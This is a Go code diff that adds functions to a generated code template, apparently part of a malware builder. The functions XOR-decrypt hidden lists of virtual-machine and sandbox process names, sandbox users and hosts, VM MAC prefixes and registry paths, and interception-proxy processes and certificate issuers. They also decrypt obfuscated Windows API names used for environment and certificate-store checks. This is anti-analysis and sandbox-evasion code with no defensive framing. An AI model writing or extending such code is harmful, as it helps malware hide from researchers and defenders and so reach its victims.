@@ -469,5 +469,39 @@ func getBuilderToken() []byte {
 	}
 	return xor(encBuilderToken, decryptionKey)
 }
+
+func decryptList(enc []byte) []string {
+	if len(enc) == 0 {
+		return nil
+	}
+	blob := xor(enc, decryptionKey)
+	return strings.Split(string(blob), "\x00")
+}
+
+func getVmProcesses() []string          { return decryptList(encVmProcesses) }
+func getSandboxProcs() []string         { return decryptList(encSandboxProcs) }
+func getVmFiles() []string              { return decryptList(encVmFiles) }
+func getSandboxUsers() []string         { return decryptList(encSandboxUsers) }
+func getSandboxHosts() []string         { return decryptList(encSandboxHosts) }
+func getVmMacPrefixes() []string        { return decryptList(encVmMacPrefixes) }
+func getMitmProcs() []string            { return decryptList(encMitmProcs) }
+func getMitmIssuers() []string          { return decryptList(encMitmIssuers) }
+func getVmRegPaths() []string           { return decryptList(encVmRegPaths) }
+
+func getGlobalMemoryStatusExName() string { return string(xor(encGlobalMemoryStatusExName, decryptionKey)) }
+func getGetDiskFreeSpaceExWName() string  { return string(xor(encGetDiskFreeSpaceExWName, decryptionKey)) }
+func getGetTickCount64Name() string       { return string(xor(encGetTickCount64Name, decryptionKey)) }
+func getRegOpenKeyExWName() string        { return string(xor(encRegOpenKeyExWName, decryptionKey)) }
+func getRegCloseKeyName() string          { return string(xor(encRegCloseKeyName, decryptionKey)) }
+func getGetSystemMetricsName() string     { return string(xor(encGetSystemMetricsName, decryptionKey)) }
+func getCreateToolhelp32SnapshotName() string { return string(xor(encCreateToolhelp32SnapshotName, decryptionKey)) }
+func getProcess32FirstWName() string      { return string(xor(encProcess32FirstWName, decryptionKey)) }
+func getProcess32NextWName() string       { return string(xor(encProcess32NextWName, decryptionKey)) }
+func getCrypt32DLL() string               { return string(xor(encCrypt32Dll, decryptionKey)) }
+func getCertOpenSystemStoreWName() string { return string(xor(encCertOpenSystemStoreWName, decryptionKey)) }
+func getCertEnumCertsName() string        { return string(xor(encCertEnumCertsName, decryptionKey)) }
+func getCertGetNameStringWName() string   { return string(xor(encCertGetNameStringWName, decryptionKey)) }
+func getCertFreeCertCtxName() string      { return string(xor(encCertFreeCertCtxName, decryptionKey)) }
+func getCertCloseStoreName() string       { return string(xor(encCertCloseStoreName, decryptionKey)) }
 `)
 }
